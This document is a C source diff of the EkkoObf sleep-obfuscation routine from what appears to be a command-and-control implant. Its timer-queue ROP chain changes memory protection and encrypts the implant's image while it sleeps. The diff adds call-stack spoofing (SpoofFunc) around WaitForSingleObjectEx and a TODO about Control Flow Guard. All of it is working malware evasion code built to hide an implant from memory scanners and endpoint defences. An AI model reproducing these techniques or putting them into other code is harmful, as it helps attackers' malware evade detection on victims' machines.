@@ -447,6 +447,8 @@ VOID EkkoObf( DWORD TimeOut )
                 RopSetEvt.Rcx   = SleepEvent;
                 RopSetEvt.Rdx   = NULL;
 
+                // TODO: maybe add those functions to Cfg address list using CfgAddressAdd.
+
                 if ( ! NT_SUCCESS( Instance->Win32.RtlCreateTimer( Queue, &Timer, Instance->Syscall.NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
                 if ( ! NT_SUCCESS( Instance->Win32.RtlCreateTimer( Queue, &Timer, Instance->Syscall.NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
                 if ( ! NT_SUCCESS( Instance->Win32.RtlCreateTimer( Queue, &Timer, Instance->Syscall.NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
@@ -454,10 +456,11 @@ VOID EkkoObf( DWORD TimeOut )
                 if ( ! NT_SUCCESS( Instance->Win32.RtlCreateTimer( Queue, &Timer, Instance->Syscall.NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
                 if ( ! NT_SUCCESS( Instance->Win32.RtlCreateTimer( Queue, &Timer, Instance->Syscall.NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
 
-                Instance->Win32.WaitForSingleObjectEx( SleepEvent, INFINITE, FALSE );
+                // Instance->Win32.WaitForSingleObjectEx( SleepEvent, INFINITE, FALSE );
+                SpoofFunc( Instance->Win32.WaitForSingleObjectEx, Instance->Modules.KernelBase, IMAGE_SIZE( Instance->Modules.KernelBase ), SleepEvent, INFINITE, FALSE );
             }
 
-            LEAVE:
+        LEAVE:
             if ( Queue)
                 Instance->Win32.RtlDeleteTimerQueue( Queue );
 
